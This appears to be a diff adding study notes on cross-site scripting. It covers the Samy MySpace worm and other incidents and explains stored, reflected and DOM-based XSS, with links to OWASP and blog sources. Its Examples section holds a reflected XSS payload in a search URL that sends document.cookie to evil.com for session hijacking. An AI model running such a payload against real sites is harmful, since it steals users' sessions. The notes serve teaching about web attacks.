@@ -1,0 +1,49 @@
+Cross Site Scripting
+--------------------
+Samy XSS worm within 20 hours spread to over one million MySpace users.
+
+The worm itself was relatively harmless, it carried a payload that would display the string "but most of all, samy is my hero" on a victim's MySpace profile page as well as send Samy a friend request. When a user viewed that profile page, the payload would then be replicated and planted on their own profile page continuing the distribution of the worm.
+
+https://en.wikipedia.org/wiki/Samy_(computer_worm)
+
+Facebook XSS attacks
+
+http://theharmonyguy.com/oldsite/2011/04/21/recent-facebook-xss-attacks-show-increasing-sophistication/
+
+CIA
+
+https://thehackernews.com/2011/06/xss-attack-on-cia-central-itelligence.html
+
+
+Examples
+--------
+
+https://example.com/search.php?query=<script>document.InnerHTML += "<img src='
+http://evil.com?cookie="+document.cookie+"'>"</script>
+
+
+It would result in this, which sends the cookies to the attacker. If there for example were sessions id, an attacker could hijack the session.
+
+
+https://blog.detectify.com/2016/05/13/owasp-top-10-cross-site-scripting-3/
+
+
+
+
+Stored or Persistent XSS
+--------------
+
+Stored XSS generally occurs when user input is stored on the target server, such as in a database, in a message forum, visitor log, comment field, etc. And then a victim is able to retrieve the stored data from the web application without that data being made safe to render in the browser. With the advent of HTML5, and other browser technologies, we can envision the attack payload being permanently stored in the victim’s browser, such as an HTML5 database, and never being sent to the server at all. 
+
+Reflected or Non-Persistent XSS
+-------------------------------
+
+Reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request, without that data being made safe to render in the browser, and without permanently storing the user provided data. In some cases, the user provided data may never even leave the browser (see DOM Based XSS next). 
+
+DOM Based XSS
+-------------
+As defined by Amit Klein, who published the first article about this issue[1], DOM Based XSS is a form of XSS where the entire tainted data flow from source to sink takes place in the browser, i.e., the source of the data is in the DOM, the sink is also in the DOM, and the data flow never leaves the browser. For example, the source (where malicious data is read) could be the URL of the page (e.g., document.location.href), or it could be an element of the HTML, and the sink is a sensitive method call that causes the execution of the malicious data (e.g., document.write)." 
+
+https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting
+
+
